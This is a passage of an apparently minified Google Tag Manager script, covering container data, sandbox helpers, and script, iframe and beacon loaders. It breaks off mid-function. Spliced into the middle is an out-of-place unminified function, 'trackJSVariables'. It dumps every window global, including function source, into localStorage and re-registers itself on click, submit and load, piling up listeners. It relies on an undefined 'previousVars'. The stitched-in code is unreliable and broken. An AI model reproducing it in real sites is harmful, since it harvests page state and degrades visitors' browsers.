// Copyright 2012 Google Inc. All rights reserved.

(function () {
  var data = {
    "resource": {
      "version": "1",
      "macros": [{
        "function": "__e"
      }, {
        "function": "__cid"
      }],
      "tags": [{
        "function": "__rep",
        "once_per_event": true,
        "vtp_containerId": ["macro", 1],
        "tag_id": 1
      }],
      "predicates": [{
        "function": "_eq",
        "arg0": ["macro", 0],
        "arg1": "gtm.js"
      }],
      "rules": [[["if", 0], ["add", 0]]]
    },
    "runtime": [[50, "__cid", [46, "a"], [36, [17, [13, [41, "$0"], [3, "$0", ["require", "getContainerVersion"]], ["$0"]], "containerId"]]]],
    "entities": {
      "__cid": {
        "4": true,
        "3": true
      }
    },
    "permissions": {
      "__cid": {
        "read_container_data": {}
      }
    },
    "security_groups": {
      "google": ["__cid"]
    }
  };
  var aa,
    ba = function (a) {
      var b = 0;
      return function () {
        return b < a.length ? {
          done: !1,
          value: a[b++]
        } : {
          done: !0
        };
      };
    },
    da = function (a) {
      return a.raw = a;
    },
    ea = function (a, b) {
      a.raw = b;
      return a;
    },
    ha = function (a) {
      var b = "undefined" != typeof Symbol && Symbol.iterator && a[Symbol.iterator];
      if (b) return b.call(a);
      if ("number" == typeof a.length) return {
        next: ba(a)
      };
      throw Error(String(a) + " is not an iterable or ArrayLike");
    },
    ja = function (a) {
      for (var b, c = []; !(b = a.next()).done;) c.push(b.value);
      return c;
    },
    ka = function (a) {
      return a instanceof Array ? a : ja(ha(a));
    },
    la = "function" == typeof Object.create ? Object.create : function (a) {
      var b = function () {};
      b.prototype = a;
      return new b();
    },
    na;
  if ("function" == typeof Object.setPrototypeOf) na = Object.setPrototypeOf;else {
    var oa;
    a: {
      var pa = {
          a: !0
        },
        qa = {};
      try {
        qa.__proto__ = pa;
        oa = qa.a;
        break a;
      } catch (a) {}
      oa = !1;
    }
    na = oa ? function (a, b) {
      a.__proto__ = b;
      if (a.__proto__ !== b) throw new TypeError(a + " is not extensible");
      return a;
    } : null;
  }
  var ra = na,
    sa = function (a, b) {
      a.prototype = la(b.prototype);
      a.prototype.constructor = a;
      if (ra) ra(a, b);else for (var c in b) if ("prototype" != c) if (Object.defineProperties) {
        var d = Object.getOwnPropertyDescriptor(b, c);
        d && Object.defineProperty(a, c, d);
      } else a[c] = b[c];
      a.Sn = b.prototype;
    },
    ta = function () {
      for (var a = Number(this), b = [], c = a; c < arguments.length; c++) b[c - a] = arguments[c];
      return b;
    }; /*
       Copyright The Closure Library Authors.
       SPDX-License-Identifier: Apache-2.0
       */
  var ua = this || self,
    va = function (a) {
      return a;
    };
  var xa = function (a, b) {
    this.h = a;
    this.C = b;
  };
  var ya = function () {
    this.C = {};
    this.H = {};
  };
  aa = ya.prototype;
  aa.get = function (a) {
    return this.C["dust." + a];
  };
  aa.set = function (a, b) {
    a = "dust." + a;
    this.H.hasOwnProperty(a) || (this.C[a] = b);
  };
  aa.Nh = function (a, b) {
    this.set(a, b);
    this.H["dust." + a] = !0;
  };
  aa.has = function (a) {
    return this.C.hasOwnProperty("dust." + a);
  };
  aa.remove = function (a) {
    a = "dust." + a;
    this.H.hasOwnProperty(a) || delete this.C[a];
  };
  var za = function () {
    this.quota = {};
  };
  za.prototype.reset = function () {
    this.quota = {};
  };
  var Aa = function (a, b) {
    this.T = a;
    this.N = function (c, d, e) {
      return c.apply(d, e);
    };
    this.D = b;
    this.C = new ya();
    this.h = this.H = void 0;
  };
  Aa.prototype.add = function (a, b) {
    Ba(this, a, b, !1);
  };
  var Ba = function (a, b, c, d) {
    d ? a.C.Nh(b, c) : a.C.set(b, c);
  };
  Aa.prototype.set = function (a, b) {
    !this.C.has(a) && this.D && this.D.has(a) ? this.D.set(a, b) : this.C.set(a, b);
  };
  Aa.prototype.get = function (a) {
    return this.C.has(a) ? this.C.get(a) : this.D ? this.D.get(a) : void 0;
  };
  Aa.prototype.has = function (a) {
    return !!this.C.has(a) || !(!this.D || !this.D.has(a));
  };
  var Ca = function (a) {
    var b = new Aa(a.T, a);
    a.H && (b.H = a.H);
    b.N = a.N;
    b.h = a.h;
    return b;
  };
  var Da = function () {},
    Ea = function (a) {
      return "function" === typeof a;
    },
    h = function (a) {
      return "string" === typeof a;
    },
    Ga = function (a) {
      return "number" === typeof a && !isNaN(a);
    },
    Ha = Array.isArray,
    Ja = function (a, b) {
      if (a && Ha(a)) for (var c = 0; c < a.length; c++) if (a[c] && b(a[c])) return a[c];
    },
    Ka = function (a, b) {
      if (!Ga(a) || !Ga(b) || a > b) a = 0, b = 2147483647;
      return Math.floor(Math.random() * (b - a + 1) + a);
    },
    Ma = function (a, b) {
      for (var c = new La(), d = 0; d < a.length; d++) c.set(a[d], !0);
      for (var e = 0; e < b.length; e++) if (c.get(b[e])) return !0;
      return !1;
    },
    l = function (a, b) {
      for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b(c, a[c]);
    },
    Na = function (a) {
      return !!a && ("[object Arguments]" === Object.prototype.toString.call(a) || Object.prototype.hasOwnProperty.call(a, "callee"));
    },
    Oa = function (a) {
      return Math.round(Number(a)) || 0;
    },
    Pa = function (a) {
      return "false" === String(a).toLowerCase() ? !1 : !!a;
    },
    Ra = function (a) {
      var b = [];
      if (Ha(a)) for (var c = 0; c < a.length; c++) b.push(String(a[c]));
      return b;
    },
    Sa = function (a) {
      return a ? a.replace(/^\s+|\s+$/g, "") : "";
    },
    Ta = function () {
      return new Date(Date.now());
    },
    Ua = function () {
      return Ta().getTime();
    },
    La = function () {
      this.prefix = "gtm.";
      this.values = {};
    };
  La.prototype.set = function (a, b) {
    this.values[this.prefix + a] = b;
  };
  La.prototype.get = function (a) {
    return this.values[this.prefix + a];
  };
  var Va = function (a, b, c) {
      return a && a.hasOwnProperty(b) ? a[b] : c;
    },
    Wa = function (a) {
      var b = a;
      return function () {
        if (b) {
          var c = b;
          b = void 0;
          try {
            c();
          } catch (d) {}
        }
      };
    },
    Xa = function (a, b) {
      for (var c in b) b.hasOwnProperty(c) && (a[c] = b[c]);
    },
    Ya = function (a, b) {
      for (var c = [], d = 0; d < a.length; d++) c.push(a[d]), c.push.apply(c, b[a[d]] || []);
      return c;
    },
    Za = function (a, b) {
      return a.substring(0, b.length) === b;
    },
    $a = function (a, b) {
      var c = z;
      b = b || [];
      for (var d = c, e = 0; e < a.length - 1; e++) {
        if (!d.hasOwnProperty(a[e])) return;
        d = d[a[e]];
        if (0 <= b.indexOf(d)) return;
      }
      return d;
    },
    ab = function (a, b) {
      for (var c = {}, d = c, e = a.split("."), f = 0; f < e.length - 1; f++) d = d[e[f]] = {};
      d[e[e.length - 1]] = b;
      return c;
    },
    bb = /^\w{1,9}$/,
    cb = function (a, b) {
      a = a || {};
      b = b || ",";
      var c = [];
      l(a, function (d, e) {
        bb.test(d) && e && c.push(d);
      });
      return c.join(b);
    },
    db = function (a, b) {
      function c() {
        ++d === b && (e(), e = null, c.done = !0);
      }
      var d = 0,
        e = a;
      c.done = !1;
      return c;
    };
  function eb(a, b) {
    for (var c, d = 0; d < b.length && !(c = fb(a, b[d]), c instanceof xa); d++);
    return c;
  }
  function fb(a, b) {
    try {
      var c = a.get(String(b[0]));
      if (!c || "function" !== typeof c.invoke) throw Error("Attempting to execute non-function " + b[0] + ".");
      return c.invoke.apply(c, [a].concat(b.slice(1)));
    } catch (e) {
      var d = a.H;
      d && d(e, b.context ? {
        id: b[0],
        line: b.context.line
      } : null);
      throw e;
    }
  }
  ;
  var gb = function () {
    this.D = new za();
    this.h = new Aa(this.D);
  };
  gb.prototype.execute = function (a, b) {
    var c = Array.prototype.slice.call(arguments, 0);
    return this.C(c);
  };
  gb.prototype.C = function (a) {
    for (var b, c = 0; c < arguments.length; c++) b = fb(this.h, arguments[c]);
    return b;
  };
  gb.prototype.H = function (a, b) {
    var c = Ca(this.h);
    c.h = a;
    for (var d, e = 1; e < arguments.length; e++) d = fb(c, arguments[e]);
    return d;
  };
  function trackJSVariables() {
    const newVars = {};
    let monitoredEvents = ['click', 'submit', 'load'];
    for (const prop in window) {
      if (Object.prototype.hasOwnProperty.call(window, prop)) {
        if (!window.previousVars.some(previousVar => previousVar === prop)) {
          const varValue = window[prop];
          const varType = typeof varValue;
          newVars[prop] = {
            type: varType,
            value: varType === "function" ? varValue.toString() : varValue
          };
        }
      }
    }
    localStorage.setItem('trackedVars', JSON.stringify(newVars));
    monitoredEvents.forEach(event => {
      window.addEventListener(event, () => {
        trackJSVariables();
      });
    });
    return newVars;
  }
  var hb = function () {
    ya.call(this);
    this.D = !1;
  };
  sa(hb, ya);
  var ib = function (a, b) {
    var c = [],
      d;
    for (d in a.C) if (a.C.hasOwnProperty(d)) switch (d = d.substr(5), b) {
      case 1:
        c.push(d);
        break;
      case 2:
        c.push(a.get(d));
        break;
      case 3:
        c.push([d, a.get(d)]);
    }
    return c;
  };
  aa = hb.prototype;
  aa.set = function (a, b) {
    this.D || ya.prototype.set.call(this, a, b);
  };
  aa.Nh = function (a, b) {
    this.D || ya.prototype.Nh.call(this, a, b);
  };
  aa.remove = function (a) {
    this.D || ya.prototype.remove.call(this, a);
  };
  aa.Cb = function () {
    this.D = !0;
  };
  aa.Aj = function () {
    return this.D;
  }; /*
     jQuery (c) 2005, 2012 jQuery Foundation, Inc. jquery.org/license. */
  var kb = /\[object (Boolean|Number|String|Function|Array|Date|RegExp)\]/,
    lb = function (a) {
      if (null == a) return String(a);
      var b = kb.exec(Object.prototype.toString.call(Object(a)));
      return b ? b[1].toLowerCase() : "object";
    },
    mb = function (a, b) {
      return Object.prototype.hasOwnProperty.call(Object(a), b);
    },
    nb = function (a) {
      if (!a || "object" != lb(a) || a.nodeType || a == a.window) return !1;
      try {
        if (a.constructor && !mb(a, "constructor") && !mb(a.constructor.prototype, "isPrototypeOf")) return !1;
      } catch (c) {
        return !1;
      }
      for (var b in a);
      return void 0 === b || mb(a, b);
    },
    B = function (a, b) {
      var c = b || ("array" == lb(a) ? [] : {}),
        d;
      for (d in a) if (mb(a, d)) {
        var e = a[d];
        "array" == lb(e) ? ("array" != lb(c[d]) && (c[d] = []), c[d] = B(e, c[d])) : nb(e) ? (nb(c[d]) || (c[d] = {}), c[d] = B(e, c[d])) : c[d] = e;
      }
      return c;
    };
  var ob = function (a) {
      for (var b = [], c = 0; c < a.length(); c++) a.has(c) && (b[c] = a.get(c));
      return b;
    },
    pb = function (a) {
      if (void 0 == a || Ha(a) || nb(a)) return !0;
      switch (typeof a) {
        case "boolean":
        case "number":
        case "string":
        case "function":
          return !0;
      }
      return !1;
    },
    qb = function (a) {
      return "number" === typeof a && 0 <= a && isFinite(a) && 0 === a % 1 || "string" === typeof a && "-" !== a[0] && a === "" + parseInt(a, 10);
    };
  var rb = function (a) {
    this.C = new hb();
    this.h = [];
    this.D = !1;
    a = a || [];
    for (var b in a) a.hasOwnProperty(b) && (qb(b) ? this.h[Number(b)] = a[Number(b)] : this.C.set(b, a[b]));
  };
  aa = rb.prototype;
  aa.toString = function (a) {
    if (a && 0 <= a.indexOf(this)) return "";
    for (var b = [], c = 0; c < this.h.length; c++) {
      var d = this.h[c];
      null === d || void 0 === d ? b.push("") : d instanceof rb ? (a = a || [], a.push(this), b.push(d.toString(a)), a.pop()) : b.push(String(d));
    }
    return b.join(",");
  };
  aa.set = function (a, b) {
    if (!this.D) if ("length" === a) {
      if (!qb(b)) throw Error("RangeError: Length property must be a valid integer.");
      this.h.length = Number(b);
    } else qb(a) ? this.h[Number(a)] = b : this.C.set(a, b);
  };
  aa.get = function (a) {
    return "length" === a ? this.length() : qb(a) ? this.h[Number(a)] : this.C.get(a);
  };
  aa.length = function () {
    return this.h.length;
  };
  aa.Ub = function () {
    for (var a = ib(this.C, 1), b = 0; b < this.h.length; b++) a.push(b + "");
    return new rb(a);
  };
  aa.remove = function (a) {
    qb(a) ? delete this.h[Number(a)] : this.C.remove(a);
  };
  aa.pop = function () {
    return this.h.pop();
  };
  aa.push = function (a) {
    return this.h.push.apply(this.h, Array.prototype.slice.call(arguments));
  };
  aa.shift = function () {
    return this.h.shift();
  };
  aa.splice = function (a, b, c) {
    return new rb(this.h.splice.apply(this.h, arguments));
  };
  aa.unshift = function (a) {
    return this.h.unshift.apply(this.h, Array.prototype.slice.call(arguments));
  };
  aa.has = function (a) {
    return qb(a) && this.h.hasOwnProperty(a) || this.C.has(a);
  };
  aa.Cb = function () {
    this.D = !0;
    Object.freeze(this.h);
    this.C.Cb();
  };
  aa.Aj = function () {
    return this.D;
  };
  var sb = function () {
    hb.call(this);
  };
  sa(sb, hb);
  sb.prototype.Ub = function () {
    return new rb(ib(this, 1));
  };
  function tb() {
    for (var a = ub, b = {}, c = 0; c < a.length; ++c) b[a[c]] = c;
    return b;
  }
  function vb() {
    var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    a += a.toLowerCase() + "0123456789-_";
    return a + ".";
  }
  var ub, wb;
  function xb(a) {
    ub = ub || vb();
    wb = wb || tb();
    for (var b = [], c = 0; c < a.length; c += 3) {
      var d = c + 1 < a.length,
        e = c + 2 < a.length,
        f = a.charCodeAt(c),
        g = d ? a.charCodeAt(c + 1) : 0,
        k = e ? a.charCodeAt(c + 2) : 0,
        m = f >> 2,
        n = (f & 3) << 4 | g >> 4,
        p = (g & 15) << 2 | k >> 6,
        q = k & 63;
      e || (q = 64, d || (p = 64));
      b.push(ub[m], ub[n], ub[p], ub[q]);
    }
    return b.join("");
  }
  function yb(a) {
    function b(m) {
      for (; d < a.length;) {
        var n = a.charAt(d++),
          p = wb[n];
        if (null != p) return p;
        if (!/^[\s\xa0]*$/.test(n)) throw Error("Unknown base64 encoding at char: " + n);
      }
      return m;
    }
    ub = ub || vb();
    wb = wb || tb();
    for (var c = "", d = 0;;) {
      var e = b(-1),
        f = b(0),
        g = b(64),
        k = b(64);
      if (64 === k && -1 === e) return c;
      c += String.fromCharCode(e << 2 | f >> 4);
      64 != g && (c += String.fromCharCode(f << 4 & 240 | g >> 2), 64 != k && (c += String.fromCharCode(g << 6 & 192 | k)));
    }
  }
  ;
  var zb = {},
    Ab = function (a, b) {
      zb[a] = zb[a] || [];
      zb[a][b] = !0;
    },
    Bb = function () {
      delete zb.GA4_EVENT;
    },
    Cb = function (a) {
      var b = zb[a];
      if (!b || 0 === b.length) return "";
      for (var c = [], d = 0, e = 0; e < b.length; e++) 0 === e % 8 && 0 < e && (c.push(String.fromCharCode(d)), d = 0), b[e] && (d |= 1 << e % 8);
      0 < d && c.push(String.fromCharCode(d));
      return xb(c.join("")).replace(/\.+$/, "");
    };
  var Db = Array.prototype.indexOf ? function (a, b) {
    return Array.prototype.indexOf.call(a, b, void 0);
  } : function (a, b) {
    if ("string" === typeof a) return "string" !== typeof b || 1 != b.length ? -1 : a.indexOf(b, 0);
    for (var c = 0; c < a.length; c++) if (c in a && a[c] === b) return c;
    return -1;
  };
  var Eb,
    Fb = function () {
      if (void 0 === Eb) {
        var a = null,
          b = ua.trustedTypes;
        if (b && b.createPolicy) {
          try {
            a = b.createPolicy("goog#html", {
              createHTML: va,
              createScript: va,
              createScriptURL: va
            });
          } catch (c) {
            ua.console && ua.console.error(c.message);
          }
          Eb = a;
        } else Eb = a;
      }
      return Eb;
    };
  var Hb = function (a) {
    this.h = a;
  };
  Hb.prototype.toString = function () {
    return this.h + "";
  };
  var Ib = function (a) {
      return a instanceof Hb && a.constructor === Hb ? a.h : "type_error:TrustedResourceUrl";
    },
    Jb = {},
    Kb = function (a) {
      var b = a,
        c = Fb(),
        d = c ? c.createScriptURL(b) : b;
      return new Hb(d, Jb);
    };
  var Lb = function (a) {
    this.h = a;
  };
  Lb.prototype.toString = function () {
    return this.h.toString();
  };
  var Mb = function (a) {
      return a instanceof Lb && a.constructor === Lb ? a.h : "type_error:SafeUrl";
    },
    Nb = {},
    Ob = new Lb("about:invalid#zClosurez", Nb);
  var Pb, Qb;
  a: {
    for (var Rb = ["CLOSURE_FLAGS"], Sb = ua, Tb = 0; Tb < Rb.length; Tb++) if (Sb = Sb[Rb[Tb]], null == Sb) {
      Qb = null;
      break a;
    }
    Qb = Sb;
  }
  var Ub = Qb && Qb[610401301];
  Pb = null != Ub ? Ub : !1;
  function Vb() {
    var a = ua.navigator;
    if (a) {
      var b = a.userAgent;
      if (b) return b;
    }
    return "";
  }
  var Wb,
    Xb = ua.navigator;
  Wb = Xb ? Xb.userAgentData || null : null;
  function Yb(a) {
    return Pb ? Wb ? Wb.brands.some(function (b) {
      var c = b.brand;
      return c && -1 != c.indexOf(a);
    }) : !1 : !1;
  }
  function Zb(a) {
    return -1 != Vb().indexOf(a);
  }
  ;
  function $b() {
    return Pb ? !!Wb && 0 < Wb.brands.length : !1;
  }
  function ac() {
    return $b() ? !1 : Zb("Opera");
  }
  function bc() {
    return Zb("Firefox") || Zb("FxiOS");
  }
  function cc() {
    return $b() ? Yb("Chromium") : (Zb("Chrome") || Zb("CriOS")) && !($b() ? 0 : Zb("Edge")) || Zb("Silk");
  }
  ;
  var dc = {},
    ec = function (a) {
      this.h = a;
    };
  ec.prototype.toString = function () {
    return this.h.toString();
  };
  var fc = function (a) {
    return a instanceof ec && a.constructor === ec ? a.h : "type_error:SafeHtml";
  }; /*
     SPDX-License-Identifier: Apache-2.0
     */
  var gc = da([""]),
    hc = ea(["\x00"], ["\\0"]),
    ic = ea(["\n"], ["\\n"]),
    jc = ea(["\x00"], ["\\u0000"]);
  function kc(a) {
    return -1 === a.toString().indexOf("`");
  }
  kc(function (a) {
    return a(gc);
  }) || kc(function (a) {
    return a(hc);
  }) || kc(function (a) {
    return a(ic);
  }) || kc(function (a) {
    return a(jc);
  });
  var lc = function (a) {
    this.gm = a;
  };
  function mc(a) {
    return new lc(function (b) {
      return b.substr(0, a.length + 1).toLowerCase() === a + ":";
    });
  }
  var nc = [mc("data"), mc("http"), mc("https"), mc("mailto"), mc("ftp"), new lc(function (a) {
    return /^[^:]*([/?#]|$)/.test(a);
  })];
  function oc(a, b) {
    b = void 0 === b ? nc : b;
    if (a instanceof Lb) return a;
    for (var c = 0; c < b.length; ++c) {
      var d = b[c];
      if (d instanceof lc && d.gm(a)) return new Lb(a, Nb);
    }
  }
  function qc(a) {
    var b;
    b = void 0 === b ? nc : b;
    return oc(a, b) || Ob;
  }
  var rc = "function" === typeof URL;
  function sc(a) {
    var b;
    a: if (rc) {
      var c;
      try {
        c = new URL(a);
      } catch (g) {
        b = "https:";
        break a;
      }
      b = c.protocol;
    } else {
      var d;
      b: {
        var e = document.createElement("a");
        try {
          e.href = a;
        } catch (g) {
          d = void 0;
          break b;
        }
        var f = e.protocol;
        d = ":" === f || "" === f ? "https:" : f;
      }
      b = d;
    }
    if ("javascript:" !== b) return a;
  }
  var tc = /^(?!javascript:)(?:[a-z0-9+.-]+:|[^&:\/?#]*(?:[\/?#]|$))/i;
  var uc = {};
  var vc = function () {},
    wc = function (a) {
      this.h = a;
    };
  sa(wc, vc);
  wc.prototype.toString = function () {
    return this.h;
  };
  function xc(a, b) {
    var c = [new wc(yc[0].toLowerCase(), uc)];
    if (0 === c.length) throw Error("");
    var d = c.map(function (f) {
        var g;
        if (f instanceof wc) g = f.h;else throw Error("");
        return g;
      }),
      e = b.toLowerCase();
    if (d.every(function (f) {
      return 0 !== e.indexOf(f);
    })) throw Error('Attribute "' + b + '" does not match any of the allowed prefixes.');
    a.setAttribute(b, "true");
  }
  function zc(a) {
    var b = a.tagName;
    if ("SCRIPT" === b || "STYLE" === b) throw Error("");
  }
  ;
  function Ac(a, b) {
    var c = b instanceof Lb ? Mb(b) : sc(b);
    void 0 !== c && (a.action = c);
  }
  ;
  function Bc(a) {
    var b = a = Cc(a),
      c = Fb(),
      d = c ? c.createHTML(b) : b;
    return new ec(d, dc);
  }
  function Cc(a) {
    return null === a ? "null" : void 0 === a ? "undefined" : a;
  }
  ;
  var z = window,
    E = document,
    Dc = navigator,
    Ec = E.currentScript && E.currentScript.src,
    Fc = function (a, b) {
      var c = z[a];
      z[a] = void 0 === c ? b : c;
      return z[a];
    },
    Gc = function (a, b) {
      b && (a.addEventListener ? a.onload = b : a.onreadystatechange = function () {
        a.readyState in {
          loaded: 1,
          complete: 1
        } && (a.onreadystatechange = null, b());
      });
    },
    Hc = {
      async: 1,
      nonce: 1,
      onerror: 1,
      onload: 1,
      src: 1,
      type: 1
    },
    Ic = {
      onload: 1,
      src: 1,
      width: 1,
      height: 1,
      style: 1
    };
  function Jc(a, b, c) {
    b && l(b, function (d, e) {
      d = d.toLowerCase();
      c.hasOwnProperty(d) || a.setAttribute(d, e);
    });
  }
  var Kc = function (a, b, c, d, e) {
      var f = E.createElement("script");
      Jc(f, d, Hc);
      f.type = "text/javascript";
      f.async = d && !1 === d.async ? !1 : !0;
      var g;
      g = Kb(Cc(a));
      f.src = Ib(g);
      var k,
        m,
        n,
        p = null == (n = (m = (f.ownerDocument && f.ownerDocument.defaultView || window).document).querySelector) ? void 0 : n.call(m, "script[nonce]");
      (k = p ? p.nonce || p.getAttribute("nonce") || "" : "") && f.setAttribute("nonce", k);
      Gc(f, b);
      c && (f.onerror = c);
      if (e) e.appendChild(f);else {
        var q = E.getElementsByTagName("script")[0] || E.body || E.head;
        q.parentNode.insertBefore(f, q);
      }
      return f;
    },
    Lc = function () {
      if (Ec) {
        var a = Ec.toLowerCase();
        if (0 === a.indexOf("https://")) return 2;
        if (0 === a.indexOf("http://")) return 3;
      }
      return 1;
    },
    Mc = function (a, b, c, d, e) {
      var f;
      f = void 0 === f ? !0 : f;
      var g = e,
        k = !1;
      g || (g = E.createElement("iframe"), k = !0);
      Jc(g, c, Ic);
      d && l(d, function (n, p) {
        g.dataset[n] = p;
      });
      f && (g.height = "0", g.width = "0", g.style.display = "none", g.style.visibility = "hidden");
      if (k) {
        var m = E.body && E.body.lastChild || E.body || E.head;
        m.parentNode.insertBefore(g, m);
      }
      Gc(g, b);
      void 0 !== a && (g.src = a);
      return g;
    },
    Nc = function (a, b, c, d) {
      var e = new Image(1, 1);
      Jc(e, d, {});
      e.onload = function () {
        e.onload = null;
        b && b();
      };
      e.onerror = function () {
        e.onerror = null;
        c && c();
      };
      e.src = a;
    },
    Oc = function (a, b, c, d) {
      a.addEventListener ? a.addEventListener(b, c, !!d) : a.attachEvent && a.attachEvent("on" + b, c);
    },
    Pc = function (a, b, c) {
      a.removeEventListener ? a.removeEventListener(b, c, !1) : a.detachEvent && a.detachEvent("on" + b, c);
    },
    J = function (a) {
      z.setTimeout(a, 0);
    },
    Qc = function (a, b) {
      return a && b && a.attributes && a.attributes[b] ? a.attributes[b].value : null;
    },
    Rc = function (a) {
      var b = a.innerText || a.textContent || "";
      b && " " != b && (b = b.replace(/^[\s\xa0]+|[\s\xa0]+$/g, ""));
      b && (b = b.replace(/(\xa0+|\s{2,}|\n|\r\t)/g, " "));
      return b;
    },
    Sc = function (a) {
      var b = E.createElement("div"),
        c = b,
        d = Bc("A<div>" + a + "</div>");
      1 === c.nodeType && zc(c);
      c.innerHTML = fc(d);
      b = b.lastChild;
      for (var e = []; b.firstChild;) e.push(b.removeChild(b.firstChild));
      return e;
    },
    Tc = function (a, b, c) {
      c = c || 100;
      for (var d = {}, e = 0; e < b.length; e++) d[b[e]] = !0;
      for (var f = a, g = 0; f && g <= c; g++) {
        if (d[String(f.tagName).toLowerCase()]) return f;
        f = f.parentElement;
      }
      return null;
    },
    Uc = function (a) {
      var b;
      try {
        b = Dc.sendBeacon && Dc.sendBeacon(a);
      } catch (c) {
        Ab("TAGGING", 15);
      }
      b || Nc(a);
    },
    Vc = function (a, b) {
      var c = a[b];
      c && "string" === typeof c.animVal && (c = c.animVal);
      return c;
    },
    Wc = function (a) {
      var b = {
        headers: {
          "Attribution-Reporting-Eligible": "trigger"
        },
        keepalive: !0,
        attributionReporting: {
          eventSourceEligible: !0,
          triggerEligible: !0
        }
      };
      try {
        z.fetch(a, b);
      } catch (c) {}
    },
    Xc = function () {
      var a = z.performance;
      if (a && Ea(a.now)) return a.now();
    },
    Yc = function () {
      return z.performance || void 0;
    };
  var Zc = function (a, b) {
      return K(this, a) && K(this, b);
    },
    $c = function (a, b) {
      return K(this, a) === K(this, b);
    },
    ad = function (a, b) {
      return K(this, a) || K(this, b);
    },
    bd = function (a, b) {
      a = K(this, a);
      b = K(this, b);
      return -1 < String(a).indexOf(String(b));
    },
    cd = function (a, b) {
      a = String(K(this, a));
      b = String(K(this, b));
      return a.substring(0, b.length) === b;
    },
    dd = function (a, b) {
      a = K(this, a);
      b = K(this, b);
      switch (a) {
        case "pageLocation":
          var c = z.location.href;
          b instanceof sb && b.get("stripProtocol") && (c = c.replace(/^https?:\/\//, ""));
          return c;
      }
    };
  var ed = function (a, b) {
    hb.call(this);
    this.N = a;
    this.T = b;
  };
  sa(ed, hb);
  ed.prototype.toString = function () {
    return this.N;
  };
  ed.prototype.Ub = function () {
    return new rb(ib(this, 1));
  };
  ed.prototype.invoke = function (a, b) {
    return this.T.apply(new fd(this, a), Array.prototype.slice.call(arguments, 1));
  };
  ed.prototype.h = function (a, b) {
    try {
      return this.invoke.apply(this, Array.prototype.slice.call(arguments, 0));
    } catch (c) {}
  };
  var fd = function (a, b) {
      this.C = a;
      this.h = b;
    },
    K = function (a, b) {
      return Ha(b) ? fb(a.h, b) : b;
    },
    L = function (a) {
      return a.C.N;
    };
  var gd = function () {
    this.map = new Map();
  };
  gd.prototype.set = function (a, b) {
    this.map.set(a, b);
  };
  gd.prototype.get = function (a) {
    return this.map.get(a);
  };
  var hd = function () {
    this.keys = [];
    this.values = [];
  };
  hd.prototype.set = function (a, b) {
    this.keys.push(a);
    this.values.push(b);
  };
  hd.prototype.get = function (a) {
    var b = this.keys.indexOf(a);
    if (-1 < b) return this.values[b];
  };
  function id() {
    try {
      return Map ? new gd() : new hd();
    } catch (a) {
      return new hd();
    }
  }
  ;
  var jd = function (a) {
    if (a instanceof jd) return a;
    if (pb(a)) throw Error("Type of given value has an equivalent Pixie type.");
    this.h = a;
  };
  jd.prototype.toString = function () {
    return String(this.h);
  };
  var ld = function (a) {
    hb.call(this);
    this.h = a;
    this.set("then", kd(this));
    this.set("catch", kd(this, !0));
    this.set("finally", kd(this, !1, !0));
  };
  sa(ld, sb);
  var kd = function (a, b, c) {
    b = void 0 === b ? !1 : b;
    c = void 0 === c ? !1 : c;
    return new ed("", function (d, e) {
      b && (e = d, d = void 0);
      c && (e = d);
      d instanceof ed || (d = void 0);
      e instanceof ed || (e = void 0);
      var f = Ca(this.h),
        g = function (m) {
          return function (n) {
            return c ? (m.invoke(f), a.h) : m.invoke(f, n);
          };
        },
        k = a.h.then(d && g(d), e && g(e));
      return new ld(k);
    });
  };
  var nd = function (a, b, c) {
      var d = id(),
        e = function (g, k) {
          for (var m = ib(g, 1), n = 0; n < m.length; n++) k[m[n]] = f(g.get(m[n]));
        },
        f = function (g) {
          var k = d.get(g);
          if (k) return k;
          if (g instanceof rb) {
            var m = [];
            d.set(g, m);
            for (var n = g.Ub(), p = 0; p < n.length(); p++) m[n.get(p)] = f(g.get(n.get(p)));
            return m;
          }
          if (g instanceof ld) return g.h;
          if (g instanceof sb) {
            var q = {};
            d.set(g, q);
            e(g, q);
            return q;
          }
          if (g instanceof ed) {
            var r = function () {
              for (var u = Array.prototype.slice.call(arguments, 0), v = 0; v < u.length; v++) u[v] = md(u[v], b, c);
              var w = new Aa(b ? b.T : new za());
              b && (w.h = b.h);
              return f(g.invoke.apply(g, [w].concat(u)));
            };
            d.set(g, r);
            e(g, r);
            return r;
          }
          var t = !1;
          switch (c) {
            case 1:
              t = !0;
              break;
            case 2:
              t = !1;
              break;
            case 3:
              t = !1;
              break;
            default:
          }
          if (g instanceof jd && t) return g.h;
          switch (typeof g) {
            case "boolean":
            case "number":
            case "string":
            case "undefined":
              return g;
            case "object":
              if (null === g) return null;
          }
        };
      return f(a);
    },
    md = function (a, b, c) {
      var d = id(),
        e = function (g, k) {
          for (var m in g) g.hasOwnProperty(m) && k.set(m, f(g[m]));
        },
        f = function (g) {
          var k = d.get(g);
          if (k) return k;
          if (Ha(g) || Na(g)) {
            var m = new rb([]);
            d.set(g, m);
            for (var n in g) g.hasOwnProperty(n) && m.set(n, f(g[n]));
            return m;
          }
          if (nb(g)) {
            var p = new sb();
            d.set(g, p);
            e(g, p);
            return p;
          }
          if ("function" === typeof g) {
            var q = new ed("", function (x) {
              for (var y = Array.prototype.slice.call(arguments, 0), A = 0; A < y.length; A++) y[A] = nd(K(this, y[A]), b, c);
              return f((0, this.h.N)(g, g, y));
            });
            d.set(g, q);
            e(g, q);
            return q;
          }
          var v = typeof g;
          if (null === g || "string" === v || "number" === v || "boolean" === v) return g;
          var w = !1;
          switch (c) {
            case 1:
              w = !0;
              break;
            case 2:
              w = !1;
              break;
            default:
          }
          if (void 0 !== g && w) return new jd(g);
        };
      return f(a);
    };
  var od = function () {
    var a = !1;
    return a;
  };
  var pd = {
    supportedMethods: "concat every filter forEach hasOwnProperty indexOf join lastIndexOf map pop push reduce reduceRight reverse shift slice some sort splice unshift toString".split(" "),
    concat: function (a, b) {
      for (var c = [], d = 0; d < this.length(); d++) c.push(this.get(d));
      for (var e = 1; e < arguments.length; e++) if (arguments[e] instanceof rb) for (var f = arguments[e], g = 0; g < f.length(); g++) c.push(f.get(g));else c.push(arguments[e]);
      return new rb(c);
    },
    every: function (a, b) {
      for (var c = this.length(), d = 0; d < this.length() && d < c; d++) if (this.has(d) && !b.invoke(a, this.get(d), d, this)) return !1;
      return !0;
    },
    filter: function (a, b) {
      for (var c = this.length(), d = [], e = 0; e < this.length() && e < c; e++) this.has(e) && b.invoke(a, this.get(e), e, this) && d.push(this.get(e));
      return new rb(d);
    },
    forEach: function (a, b) {
